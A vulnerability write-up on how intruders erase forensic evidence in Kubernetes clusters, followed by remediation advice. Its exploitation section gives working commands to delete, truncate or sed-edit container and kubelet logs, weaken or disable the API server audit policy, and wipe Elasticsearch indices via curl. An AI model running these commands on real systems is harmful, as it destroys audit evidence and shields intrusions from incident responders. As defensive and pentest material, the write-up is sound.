# Kubernetes Forensic Artifact Cleanup Vulnerability

## 1. Overview Section

### Attack Vector Description

Attackers, after gaining unauthorized access to a Kubernetes cluster, may attempt to eliminate forensic evidence of their activities to hinder detection and incident response. This involves identifying and removing logs, audit trails, command histories, and other artifacts that could reveal their actions. This attack vector focuses on the *post-exploitation* phase, aiming to maintain persistent access and cover tracks.

### Potential Impact and Consequences

Successful cleanup of forensic artifacts significantly impedes incident response efforts, making it difficult to:

*   Identify the scope and nature of the attack.
*   Determine the entry point and lateral movement paths.
*   Assess the damage caused by the attacker.
*   Attribute the attack to a specific threat actor.
*   Implement effective remediation measures.

The ultimate consequence could be a prolonged compromise, leading to further data breaches, system disruptions, or financial losses.

### Risk Level Assessment

**Critical**. While not directly enabling initial access, successful artifact cleanup critically hinders incident response, effectively amplifying the impact of the initial breach. It allows attackers to operate with impunity and significantly increase the likelihood of long-term compromise.

### Technical Explanation of Why This Vulnerability Exists

This vulnerability isn't a single, discrete flaw but rather a consequence of inadequate logging, monitoring, and security configurations within a Kubernetes cluster. Specifically, the following factors contribute:

*   **Insufficient Auditing:** Incomplete or improperly configured Kubernetes auditing allows attackers to perform actions without leaving a trace.
*   **Inadequate Log Retention:** Short log retention policies allow attacker actions to be automatically purged before detection.
*   **Lack of Centralized Logging:** Decentralized logs scattered across various components (kube-apiserver, kubelet, containers) make comprehensive forensic analysis challenging and allow attackers to target specific logs.
*   **Overly Permissive RBAC:** Allowing users or service accounts excessive privileges (e.g., ability to delete logs or modify audit policies) enables attackers to manipulate forensic artifacts.
*   **Lack of Immutable Logging Infrastructure:** Without a robust and immutable logging infrastructure, attackers can easily modify or delete log files.
*   **Default Configurations:** Default configurations often lack the necessary hardening for forensic readiness.

### Prerequisites and Conditions Needed

*   **Compromised Account or Pod:** The attacker must have already gained unauthorized access to a Kubernetes cluster with sufficient privileges to interact with cluster components and modify data. This could be through stolen credentials, a vulnerable application running within a pod, or a compromised node.
*   **Knowledge of Kubernetes Architecture:** The attacker needs a solid understanding of the Kubernetes architecture to identify relevant logs, audit trails, and other artifacts.
*   **Privileges to Modify Logging Infrastructure (Optional, but HIGHLY useful):** The attacker has privileges that allow modification or deletion of logs, log configurations, or audit policies. This is ideal, but not always necessary - sometimes, simply deleting container logs directly is enough to cause issues.

## 2. Validation and Exploitation Steps Section

The following steps outline how an attacker might identify and attempt to clean up forensic artifacts.

**Phase 1: Validation (Identifying Potential Targets)**

1.  **Verify Access:** Confirm successful access to the compromised cluster.

    ```bash
    kubectl get nodes
    ```

    *   **Explanation:** This command verifies that the attacker has access to the cluster using their compromised credentials or compromised pod's service account token.
    *   **Why:** Establishing a baseline and confirming access are crucial before proceeding.
    *   **Expected Output:** A list of nodes in the cluster if the authentication is successful. If not successful, errors indicate permission issues or incorrect credentials.
    *   **Contributes to:** Validating the attacker's initial foothold.

2.  **Enumerate Audit Logs Configuration:** Check the audit policy configuration.

    ```bash
    kubectl get configmap -n kube-system kube-apiserver-audit-policy -o yaml
    ```

    *   **Explanation:** This command retrieves the audit policy configuration from the `kube-system` namespace.  The `kube-apiserver-audit-policy` configmap usually defines the audit rules.
    *   **Why:** Knowing the audit policy helps the attacker understand what actions are being logged and where.
    *   **Expected Output:** The YAML configuration of the audit policy. Look for specific rules that might be easily bypassed or overly restrictive.  If this configmap doesn't exist, audit logging might not be properly configured, presenting an opportunity.
    *   **Contributes to:** Identifying potential gaps in audit logging that can be exploited.

3.  **Check Kubelet Logging:** Examine the configuration of kubelet logs.  This will likely involve connecting to the compromised node directly.

    ```bash
    # Assume we have SSH access to the node, or can execute commands on it via a compromised pod.

    # Check kubelet service file for logging options (location and verbosity)
    cat /etc/systemd/system/kubelet.service
    ```

    *   **Explanation:** This command reads the kubelet service definition file to determine where kubelet logs are stored and how verbose they are.
    *   **Why:** Kubelet logs contain information about pod lifecycle events, resource utilization, and other critical data. Knowing their location is crucial for cleanup.
    *   **Expected Output:** The contents of the service file, which includes the location of the log file(s) (e.g., `/var/log/kubelet.log`) and any arguments passed to the kubelet process related to logging.
    *   **Contributes to:** Identifying the location of kubelet logs for potential manipulation.

4.  **Identify Centralized Logging Solutions:** Determine if a centralized logging solution (e.g., Elasticsearch, Fluentd, Loki) is in use.

    ```bash
    # Check for common logging agents running as pods
    kubectl get pods -n kube-system | grep -E "fluentd|elasticsearch|loki"
    ```

    *   **Explanation:** This command searches for pods in the `kube-system` namespace that are associated with common centralized logging solutions.
    *   **Why:** Centralized logs aggregate data from multiple sources, making them a critical target for cleanup.
    *   **Expected Output:** A list of pods related to centralized logging. If found, the attacker needs to understand how these systems ingest and store logs.
    *   **Contributes to:** Identifying centralized logging systems that need to be targeted.

5. **Identify audit log sinks:** Determine where Kubernetes audit logs are sent

   ```bash
   kubectl describe pod kube-apiserver-<your-apiserver-pod-name> -n kube-system | grep audit-policy-file
   kubectl describe pod kube-apiserver-<your-apiserver-pod-name> -n kube-system | grep audit-log-path

   # Check the api server manifest file, often located on the control plane node.
   cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep audit
   ```

   *   **Explanation:** These commands attempt to identify the audit log sink by inspecting the API server pod configuration. The `-n kube-system` option specifies the `kube-system` namespace, where the API server pod typically resides. The commands grep for "audit-policy-file" and "audit-log-path", indicating the location of the audit policy file and log file, respectively. The last command attempts to view the api server's manifest to glean more information.
   *   **Why:**  The location of audit logs determines where the attacker needs to focus their cleanup efforts.
   *   **Expected output:**  The commands should output the path to the audit policy file and/or the path to the audit log file.  If no audit logs are configured the penetration tester will not see the `audit-policy-file` or `audit-log-path` options.
   *   **Contributes to:** Identifying the audit log location.

**Phase 2: Exploitation (Artifact Cleanup)**

*It's crucial to remember that manipulating logs can be illegal and unethical in real-world scenarios without proper authorization.  This section demonstrates techniques for educational purposes and penetration testing within authorized scopes.*

1.  **Deleting Container Logs Directly:**  Attempting to delete container logs directly (requires write access to the node's filesystem where the container runtime stores the logs - e.g., `/var/log/containers`).

    ```bash
    # Inside a compromised pod running with elevated privileges or on a compromised node

    # Example - delete logs for a specific container
    rm /var/log/containers/<container_name>_<namespace>_<pod_name>_<container_id>-log.json

    # Example - truncate logs instead of deleting (to be less conspicuous)
    truncate -s 0 /var/log/containers/<container_name>_<namespace>_<pod_name>_<container_id>-log.json
    ```

    *   **Explanation:** These commands directly manipulate the container log files on the node's filesystem. The `rm` command deletes the file entirely, while `truncate` empties the file's content.
    *   **Why:** Directly deleting or truncating logs removes evidence of the container's activities.  Truncating is often preferred to deletion as it is less likely to be immediately noticed.
    *   **Expected Output:** No output if successful (or an error message if the operation fails due to permission issues).  The targeted container log file will be either deleted or emptied.
    *   **Contributes to:** Eliminating container-level logs that might contain evidence of the attack.

2.  **Modifying Kubelet Logs (if possible - VERY difficult with modern deployments):**

    ```bash
    # Requires access to the kubelet log file and write permissions.

    # Back up the log file first (essential to avoid suspicion if the process crashes later)
    cp /var/log/kubelet.log /var/log/kubelet.log.bak

    # Attempt to edit the kubelet log file, removing entries related to the attacker's actions.  Use a tool like `sed` or `vi`.

    # Example: Remove lines containing a specific IP address:
    sed -i '/<attacker_ip_address>/d' /var/log/kubelet.log

    # Example: Remove lines containing a specific username:
    sed -i '/<attacker_username>/d' /var/log/kubelet.log

    # Restart kubelet (carefully - may cause instability if not done correctly)
    systemctl restart kubelet
    ```

    *   **Explanation:** These commands attempt to modify the kubelet log file by removing entries that might be related to the attacker's activities.  `sed` is used to delete lines containing specific patterns (e.g., IP addresses, usernames).
    *   **Why:** Kubelet logs record events related to pod scheduling, resource allocation, and other critical activities.  Cleaning these logs helps cover the attacker's tracks.
    *   **Expected Output:** No output if the `sed` commands are successful. The `kubelet.log` file will be modified.  Errors may indicate permission issues or incorrect syntax.
    *   **Contributes to:** Removing evidence from the kubelet logs. *This is a dangerous operation and likely to be detected or cause stability issues.*

3.  **Disabling or Modifying Audit Logging (if sufficient privileges exist):**

    ```bash
    # Requires permission to modify configmaps in the kube-system namespace (i.e., edit the kube-apiserver-audit-policy configmap)

    kubectl edit configmap -n kube-system kube-apiserver-audit-policy
    ```

    *   **Explanation:** This command opens the audit policy configmap in an editor.  The attacker can then modify the policy to reduce the verbosity of logging, exclude specific namespaces or users from auditing, or even disable auditing altogether.
    *   **Why:** Modifying the audit policy directly reduces the amount of forensic data being collected, making it harder to detect the attacker's actions.
    *   **Expected Output:** The audit policy configuration opened in an editor. After saving the changes, the new audit policy will be applied (after the api-server detects the change and reloads config). *Note that these changes may not be immediately effective due to caching mechanisms.*
    *   **Contributes to:** Reducing the amount of forensic data collected, or even disabling auditing altogether. **Extremely dangerous and likely to be detected**.

    *Alternative approach: if the attacker can mount a volume into the kube-apiserver's pod that overwrites the audit configuration files, they can disable the audit logging in the same way.*

4. **Manipulating Centralized Logging (if applicable):** If a centralized logging system like Elasticsearch is present, attempting to query and delete relevant logs. This requires knowing the query language and credentials for the logging system.

    ```bash
    # Example with Elasticsearch (requires API access and authentication)

    # Authenticate to Elasticsearch
    curl -XGET -u <username>:<password> "http://<elasticsearch_host>:<port>/_cluster/health"

    # Delete indices related to the compromised cluster or namespace:
    curl -XDELETE -u <username>:<password> "http://<elasticsearch_host>:<port>/<index_name>"

    # Delete documents with specific information, like user ids or ips
    curl -XPOST -u <username>:<password> "http://<elasticsearch_host>:<port>/_delete_by_query" -H 'Content-Type: application/json' -d'
    {
      "query": {
        "match": {
          "user.id": "<user_id>"
        }
      }
    }
    '
    ```

    *   **Explanation:** This example demonstrates how to authenticate and interact with Elasticsearch using its REST API.  It shows how to delete indices (effectively deleting all logs for those indices) and how to delete specific documents based on a query (e.g., deleting logs related to a specific user ID).
    *   **Why:** Deleting logs from a centralized logging system removes evidence from a central repository, making detection significantly more difficult.
    *   **Expected Output:** The `curl` commands should return JSON responses indicating the status of the operation. Successful deletion will return a `200 OK` status code and information about the number of documents deleted.
    *   **Contributes to:** Eliminating evidence from the centralized logging system. This requires the attacker to understand the logging system's API, authentication methods, and query language.

**Remediation Recommendations**

1.  **Implement Robust Auditing:** Enable comprehensive Kubernetes auditing, ensuring that all critical actions are logged. Regularly review and update the audit policy to cover new attack vectors.
2.  **Centralized and Immutable Logging:**  Utilize a centralized logging solution to aggregate logs from all components.  Implement immutability for logging, such as storing logs in a WORM (Write Once Read Many) system.
3.  **Sufficient Log Retention:**  Establish a log retention policy that meets compliance requirements and allows for thorough incident investigation.
4.  **Principle of Least Privilege:**  Enforce the principle of least privilege for users and service accounts.  Grant only the minimum necessary permissions. Regularly review and revoke unnecessary privileges.
5.  **Monitoring and Alerting:**  Implement monitoring and alerting systems to detect suspicious activity, such as unusual log deletions or modifications to audit policies.
6.  **Log Integrity Monitoring:**  Implement log integrity monitoring mechanisms to detect unauthorized modifications to log files. Tools like `aide` can be used for this purpose.
7.  **RBAC Hardening:** Review and harden the RBAC configuration to prevent unauthorized access to critical resources and configurations, including the audit policy and logging infrastructure.
8.  **Regular Security Audits:** Conduct regular security audits and penetration tests to identify vulnerabilities and weaknesses in the Kubernetes environment.
9.  **Incident Response Plan:** Develop and maintain an incident response plan that includes procedures for detecting, investigating, and responding to security incidents. The plan should specifically address potential log manipulation and cleanup attempts.
10. **Runtime Security:** Implement runtime security solutions that can detect and prevent malicious activity within containers, such as file system modifications or attempts to manipulate system processes.
11. **Container Image Security:** Regularly scan container images for vulnerabilities and malware. Ensure that images are built from trusted base images and follow secure development practices. Use tools like `trivy` to scan for vulnerabilities.

By implementing these recommendations, organizations can significantly reduce the risk of successful forensic artifact cleanup and improve their ability to detect and respond to security incidents in their Kubernetes environments.
